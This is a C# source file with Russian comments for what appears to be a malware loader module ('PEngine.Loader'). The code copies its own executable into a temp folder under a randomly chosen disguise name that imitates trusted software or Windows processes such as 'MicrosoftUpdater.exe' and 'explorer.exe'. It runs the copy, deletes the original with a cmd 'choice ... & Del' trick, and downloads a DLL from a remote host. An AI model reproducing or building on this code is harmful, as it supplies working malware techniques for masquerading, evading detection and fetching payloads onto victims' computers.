namespace PEngine.Loader
{
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Security.Cryptography;

    public class MovEx
    {
        // Список имён для генерации .exe файла.
        private static readonly List<string> FakeName = new List<string>()
        {
            "Updater.exe",
            "7-Zip_Installer.exe",
            "Winrar.exe",
            "Steam_Updater.exe",
            "MicrosoftUpdater.exe",
            "Ccleaner_Updater.exe",
            "Net_Framework_Updater.exe",
            "FireFox_Updater.exe",
            "Sandboxies.exe",
            "Microsoft SQL Server.exe",
            "CoreRuntime.exe",
            "Nvidia_Updater.exe",
            "Amd_Updater.exe",
            "Synaptics.exe",
            "Notepad++.exe",
            "splwow64.exe",
            "winhlp32.exe",
            "regedit.exe",
            "explorer.exe"
        };

        private static int GetNextInt32(RNGCryptoServiceProvider rnd)
        {
            byte[] randomInt = new byte[4];
            rnd.GetBytes(randomInt);
            return Convert.ToInt32(randomInt[0]);
        }

        public static string RandomProcessName = ""; // зададим пустую переменную для назначения имени процесса.

        public static bool CheckPath()
        {
            HomeDirectory.Create(GlobalPath.GarbageTemp, true); // Создаём папку Garbage с удалением всех данных внутри перед началом.
            if (GlobalPath.NewStartupPath.Equals(GlobalPath.GarbageTemp)) // Проверяем существует ли наша папка Temp\Garbage\
            {
                if (NetControl.CheckURL(GlobalPath.Dll_Host)) // Проверить подключение к серверу.
                {
                    return SafeDll.Download(GlobalPath.Dll_Host); // начало загрузки .dll
                }
                else
                {
                    return false; // Если интернет отсутсвует завершаем работу.
                }
            }
            else // Если папка есть то
            {
                GeName(GlobalPath.GarbageTemp); // выполняем метод для копирования самоисполняющего файла.
                return CheckPath();
            }
        }

        private static bool GeName(string path)
        {
            using (var rnd = new RNGCryptoServiceProvider())
            {
                try
                {
                    foreach (string style in FakeName.OrderBy(x => GetNextInt32(rnd)).ToArray()) // генерируем рандомное имя из списка FakeName
                    {
                        RandomProcessName = CombineEx.Combination(path, style); //  Задаём сгенерированное имя для нового файла .exe
                        break; // Выбрали первое подходящие, выходим из цикла.
                    }
                    CombineEx.FileCopy(GlobalPath.AssemblyPath, RandomProcessName, false); // Копируем запускаемый файл в новую папку
                    ProcessKiller.Running(RandomProcessName, false); // Запускаем файл из новой папки
                    ProcessKiller.Delete("/C choice /C Y /N /D Y /T 0 & Del", GlobalPath.AssemblyPath); // Удаляем предыдущий процесс

                }
                catch { return false; }
                return true;
            }
        }

    }
}